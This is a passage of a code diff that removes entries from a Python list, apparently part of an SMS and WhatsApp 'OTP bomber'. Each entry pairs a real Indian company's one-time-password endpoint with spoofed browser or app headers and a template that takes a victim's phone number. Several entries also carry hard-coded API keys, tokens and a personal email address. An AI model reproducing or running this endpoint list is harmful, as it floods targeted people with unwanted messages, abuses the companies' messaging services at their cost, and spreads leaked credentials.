-            "Content-Type": "application/json; charset=UTF-8"
-        },
-        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
-    },
-    {
-        "name": "stratzy_sms_2",
-        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
-        "method": "POST",
-        "headers": {
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/json",
-            "origin": "https://stratzy.in",
-            "referer": "https://stratzy.in/login"
-        },
-        "data": lambda p: f'{{"phoneNo":"{p}"}}'
-    },
-    {
-        "name": "stratzy_wa_2",
-        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
-        "method": "POST",
-        "headers": {
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/json",
-            "origin": "https://stratzy.in",
-            "referer": "https://stratzy.in/login"
-        },
-        "data": lambda p: f'{{"phoneNo":"{p}"}}'
-    },
-    {
-        "name": "wellacademy_2",
-        "url": "https://wellacademy.in/store/api/numberLoginV2",
-        "method": "POST",
-        "headers": {
-            "x-requested-with": "XMLHttpRequest",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/json; charset=UTF-8",
-            "origin": "https://wellacademy.in",
-            "referer": "https://wellacademy.in/store/"
-        },
-        "data": lambda p: f'{{"contact_no":"{p}"}}'
-    },
-    {
-        "name": "hungama_2",
-        "url": "https://communication.api.hungama.com/v1/communication/otp",
-        "method": "POST",
-        "headers": {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "identifier": "home",
-            "country_code": "IN",
-            "origin": "https://www.hungama.com",
-            "referer": "https://www.hungama.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
-    },
-    {
-        "name": "servetel_3",
-        "url": "https://api.servetel.in/v1/auth/otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
-        },
-        "data": lambda p: f"mobile_number={p}"
-    },
-    {
-        "name": "merucab_2",
-        "url": "https://merucabapp.com/api/otp/generate",
-        "method": "POST",
-        "headers": {
-            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "okhttp/4.9.0"
-        },
-        "data": lambda p: f"mobile_number={p}"
-    },
-    {
-        "name": "beepkart_2",
-        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "origin": "https://www.beepkart.com",
-            "referer": "https://www.beepkart.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'
-    },
-    {
-        "name": "lendingplate_2",
-        "url": "https://lendingplate.com/api.php",
-        "method": "POST",
-        "headers": {
-            "X-Requested-With": "XMLHttpRequest",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Origin": "https://lendingplate.com",
-            "Referer": "https://lendingplate.com/personal-loan",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
-    },
-    {
-        "name": "snitch_2",
-        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "client-id": "snitch_secret",
-            "Origin": "https://www.snitch.com",
-            "Referer": "https://www.snitch.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
-    },
-    {
-        "name": "dayco_2",
-        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
-        "method": "POST",
-        "headers": {
-            "X-Requested-With": "XMLHttpRequest",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Origin": "https://ekyc.daycoindia.com",
-            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
-    },
-    {
-        "name": "penpencil_3",
-        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
-        "method": "POST",
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "user-agent": "okhttp/3.9.1"
-        },
-        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
-    },
-    {
-        "name": "imaginestore_2",
-        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
-        "method": "POST",
-        "headers": {
-            "x-requested-with": "XMLHttpRequest",
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "origin": "https://www.myimaginestore.com",
-            "referer": "https://www.myimaginestore.com/"
-        },
-        "data": lambda p: f"mobile={p}"
-    },
-    {
-        "name": "nobroker_2",
-        "url": "https://www.nobroker.in/api/v3/account/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "origin": "https://www.nobroker.in",
-            "referer": "https://www.nobroker.in/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f"phone={p}&countryCode=IN"
-    },
-    {
-        "name": "cossouq_2",
-        "url": "https://www.cossouq.com/mobilelogin/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "x-requested-with": "XMLHttpRequest",
-            "origin": "https://www.cossouq.com",
-            "referer": "https://www.cossouq.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"
-    },
-    {
-        "name": "shiprocket_4",
-        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "authorization": "Bearer null",
-            "origin": "https://app.shiprocket.in",
-            "referer": "https://app.shiprocket.in/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
-    },
-    {
-        "name": "gokwik_2",
-        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "gk-version": "20250421065835697",
-            "gk-signature": "076108",
-            "gk-udf-1": "951",
-            "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
-            "gk-merchant-id": "19g6jlc658iad",
-            "origin": "https://pdp.gokwik.co",
-            "referer": "https://pdp.gokwik.co/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
-    },
-    {
-        "name": "jockey_sms_2",
-        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
-            "Referer": "https://www.jockey.in/"
-        },
-        "data": None
-    },
-    {
-        "name": "jockey_wa_2",
-        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
-            "Referer": "https://www.jockey.in/"
-        },
-        "data": None
-    },
-    {
-        "name": "newme_2",
-        "url": "https://prodapi.newme.asia/web/otp/request",
-        "method": "POST",
-        "headers": {
-            "Timestamp": "{timestamp}",
-            "Caller": "web_app",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
-            "Content-Type": "application/json",
-            "Origin": "https://newme.asia",
-            "Referer": "https://newme.asia/"
-        },
-        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
-    },
-    {
-        "name": "univest_2",
-        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "okhttp/3.9.1"
-        },
-        "data": None
-    },
-    {
-        "name": "rappi_mx_2",
-        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json; charset=utf-8",
-            "User-Agent": "okhttp/3.9.1"
-        },
-        "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
-    },
-    {
-        "name": "foxy_2",
-        "url": "https://www.foxy.in/api/v2/users/send_otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "Platform": "web",
-            "Origin": "https://www.foxy.in",
-            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
-            "Referer": "https://www.foxy.in/onboarding",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'
-    },
-    {
-        "name": "eka_care_2",
-        "url": "https://auth.eka.care/auth/init",
-        "method": "POST",
-        "headers": {
-            "Device-Id": "5df83c463f0ff8ff",
-            "Flavour": "android",
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "okhttp/4.9.3"
-        },
-        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
-    },
-    {
-        "name": "foxy_wa_2",
-        "url": "https://www.foxy.in/api/v2/users/send_otp",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "Platform": "web",
-            "Origin": "https://www.foxy.in",
-            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
-            "Referer": "https://www.foxy.in/onboarding",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
-    },
-    {
-        "name": "smytten_2",
-        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://smytten.com",
-            "Referer": "https://smytten.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
-        },
-        "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{p}","email":"sdhabai09@gmail.com"}}'
-    },
-    {
-        "name": "wakefit_3",
-        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.wakefit.co",
-            "Referer": "https://www.wakefit.co/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
-            "API-Secret-Key": "ycq55IbIjkLb",
-            "API-Token": "c84d563b77441d784dce71323f69eb42"
-        },
-        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'
-    },
-    {
-        "name": "caratlane_2",
-        "url": "https://www.caratlane.com/cg/dhevudu",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-            "Origin": "https://www.caratlane.com",
-            "Referer": "https://www.caratlane.com/register",
-            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
-            "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
-        },
-        "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
-    },
 ]
 
 print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")
